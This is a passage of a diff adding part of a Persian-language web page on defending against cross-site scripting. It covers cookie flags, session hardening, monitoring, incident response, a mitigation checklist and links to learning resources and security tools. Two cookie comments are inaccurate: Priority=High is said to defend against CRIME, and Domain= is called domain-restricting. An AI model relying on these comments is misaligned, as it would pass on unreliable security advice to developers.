+    sessionId=abc123;
+    Secure;    # فقط HTTPS
+    HttpOnly;    # عدم دسترسی جاوااسکریپت
+    SameSite=Lax;    # محافظت در برابر CSRF
+    Path=/;    # دسترسی در کل سایت
+    Domain=example.com;  # دامنه خاص
+    Max-Age=3600;    # انقضا 1 ساعت
+    Priority=High;    # دفاع در برابر CRIME</pre>
+    
+    <div class="font-semibold text-gray-200 mb-2" dir="rtl">محافظت‌های پیشرفته نشست:</div>
+    <ul class="list-disc list-inside text-white space-y-3 mb-6" dir="rtl">
+        <li>
+            <strong>نشست‌های کوتاه مدت:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>وقفه‌های فعالیت 15-30 دقیقه‌ای</li>
+                <li>حداکثر مطلق 4-8 ساعت</li>
+            </ul>
+        </li>
+        <li>
+            <strong>اعتبارسنجی زمینه‌ای:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>اثر انگشت آدرس IP</li>
+                <li>بررسی سازگاری User-Agent</li>
+                <li>تأیید موقعیت جغرافیایی</li>
+            </ul>
+        </li>
+        <li>
+            <strong>بهترین روش‌های JWT:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>زمان انقضای کوتاه (دقیقه نه ساعت)</li>
+                <li>HMAC با رمزهای قوی</li>
+                <li>ذخیره در کوکی‌های httpOnly (نه localStorage)</li>
+            </ul>
+        </li>
+    </ul>
+    <div class="bg-blue-800 rounded-xl p-6 mt-6 mb-8" dir="rtl">
+    <div class="font-semibold text-gray-200 mb-2">چک‌لیست تقویت نشست:</div>
+    <ul class="list-disc list-inside text-white space-y-2">
+        <li>پیاده‌سازی تمام پرچم‌های توصیه شده کوکی</li>
+        <li>استفاده از چرخش نشست پس از ورود</li>
+        <li>نیاز به احراز هویت مجدد برای اقدامات حساس</li>
+        <li>نظارت بر نشست‌های همزمان</li>
+        <li>پیاده‌سازی API خاتمه نشست</li>
+    </ul>
+    </div>
+</div>
+
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-2xl font-bold text-blue-400 mb-4">5. Monitoring & Incident Response</div>
+    <p class="text-white mb-2" dir="rtl">نظارت و پاسخ به حوادث</p>
+    <p class="text-white mb-4" dir="rtl">
+        نظارت مؤثر، تلاش‌های XSS و حملات موفق را شناسایی می‌کند، در حالی که یک برنامه پاسخ به حوادث از پیش آماده شده، آسیب‌های ناشی از نقض امنیت را به حداقل می‌رساند.
+    </p>
+    
+    <div class="text-xl font-bold text-blue-400 mb-2" dir="rtl">تکنیک‌های تشخیص:</div>
+    <ul class="list-disc list-inside text-white space-y-3 mb-6" dir="rtl">
+        <li>
+            <strong>Web Application Firewalls (WAF)</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>تشخیص مبتنی بر امضا برای الگوهای XSS</li>
+                <li>تحلیل رفتاری ورودی‌های مشکوک</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Static Application Security Testing (SAST)</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>تحلیل کد برای الگوهای آسیب‌پذیر</li>
+                <li>ادغام در خطوط CI/CD</li>
+            </ul>
+        </li>
+        <li>
+            <strong>Dynamic Analysis (DAST)</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>اسکن خودکار برنامه‌های در حال اجرا</li>
+                <li>اسکن‌های برنامه‌ریزی شده منظم</li>
+            </ul>
+        </li>
+    </ul>
+    
+    <div class="text-xl font-bold text-blue-400 mb-2" dir="rtl">برنامه پاسخ به حوادث:</div>
+    <ol class="list-decimal list-inside text-white space-y-3 mb-6" dir="rtl">
+        <li>
+            <strong>مهار:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>حذف محتوای مخرب</li>
+                <li>خاتمه اجباری نشست</li>
+                <li>مسدود کردن منابع حمله</li>
+            </ul>
+        </li>
+        <li>
+            <strong>بررسی:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>تحلیل پزشکی قانونی لاگ‌ها</li>
+                <li>تعیین بردار حمله</li>
+                <li>شناسایی کاربران آسیب‌دیده</li>
+            </ul>
+        </li>
+        <li>
+            <strong>رفع:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>اصلاح آسیب‌پذیری‌ها</li>
+                <li>چرخش اسرار</li>
+                <li>به‌روزرسانی دفاعیات</li>
+            </ul>
+        </li>
+        <li>
+            <strong>ارتباطات:</strong>
+            <ul class="list-circle list-inside text-gray-300 mt-1 space-y-1">
+                <li>اطلاع‌رسانی به کاربران آسیب‌دیده</li>
+                <li>گزارش‌دهی داخلی</li>
+                <li>تحلیل پس از حادثه</li>
+            </ul>
+        </li>
+    </ol>
+    <div class="bg-blue-800 rounded-xl p-6 mt-6 mb-8">
+    <div class="text-xl font-bold text-blue-400 mb-2" dir="rtl">بهبود مستمر:</div>
+    <ul class="list-disc list-inside text-white space-y-2" dir="rtl">
+        <li>آموزش امنیتی منظم برای توسعه‌دهندگان</li>
+        <li>آزمایش نفوذ سه‌ماهه</li>
+        <li>برنامه‌های باگ بانتی</li>
+        <li>جلسات مدل‌سازی تهدید</li>
+    </ul>
+    </div>
+</div>
+
+<div class="bg-slate-800 rounded-xl p-6 mt-6 mb-8">
+  <h2 class="text-xl font-bold text-blue-400 mb-4">XSS Mitigation Checklist</h2>
+    <p class="text-l font-bold text-white mb-4" dir="rtl">چک‌لیست کاهش خطرات احتمالی XSS</p>
+    <ul class="list-disc list-inside text-white space-y-3"  dir="rtl">
+        <li>پیاده‌سازی اعتبارسنجی سختگیرانه ورودی (رویکرد لیست سفید)</li>
+        <li>استفاده از کدگذاری خروجی آگاه از زمینه</li>
+        <li>استقرار سیاست امنیتی محتوا (CSP)</li>
+        <li>تنظیم پرچم‌های HttpOnly و Secure برای کوکی‌ها</li>
+        <li>استفاده از فریمورک‌های مدرن با حفاظت‌های داخلی</li>
+        <li>اسکن منظم برای آسیب‌پذیری‌ها</li>
+        <li>آموزش روش‌های کدنویسی ایمن به توسعه‌دهندگان</li>
+    </ul>
+</div>
+
+<h2 class="text-3xl font-bold text-white mb-4">Additional Resources & References</h2>
+<div class="bg-slate-800 rounded-xl p-6 mb-6">
+    <div class="text-lg font-bold text-yellow-400 mb-2">Learning Resources</div>
+    <ul class="list-disc list-inside text-blue-300">
+        <li><a href="https://owasp.org/www-community/attacks/xss/" class="hover:underline" target="_blank" rel="noopener noreferrer">OWASP XSS — Complete documentation and examples</li></a>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting" class="hover:underline" target="_blank" rel="noopener noreferrer">PortSwigger XSS Academy — Interactive labs</li></a>
+        <li><a href="https://developers.google.com/web/fundamentals/security/csp" class="hover:underline" target="_blank" rel="noopener noreferrer">Google CSP Guide — Comprehensive CSP reference</li></a>
+    </ul>
+</div>
+<div class="bg-slate-800 rounded-xl p-6 mb-6">
+    <div class="text-lg font-bold text-yellow-400 mb-2">Security Tools</div>
+    <ul class="list-disc list-inside text-blue-300">
+        <li><a href="https://beefproject.com/" class="hover:underline" target="_blank" rel="noopener noreferrer">BeEF — Browser Exploitation Framework</li></a>
+        <li><a href="https://xsshunter.com/" class="hover:underline" target="_blank" rel="noopener noreferrer">XSS Hunter — Blind XSS platform</li></a>
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="hover:underline" target="_blank" rel="noopener noreferrer">OWASP XSS Prevention Cheat Sheet</a></li>
+    </ul>
+</div>
+
+</MainLayout>
+
+<style>
+  /* Ensure consistent card heights in grid */
+  @media (min-width: 768px) {
+    .grid > div {
+      display: flex;
+      flex-direction: column;
+    }
+    .grid > div > *:last-child {
+      margin-top: auto;
+    }
+  }
+  
+  /* Better RTL support */
+  [dir="rtl"] {
+    text-align: right;
+    font-family: 'Vazirmatn', Tahoma, Arial, sans-serif;
+  }
+  
+  /* Smooth scrolling for anchor links */
+  html {
+    scroll-behavior: smooth;
+  }
+  
+  /* Better pre tag wrapping */
+  pre {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+</style>
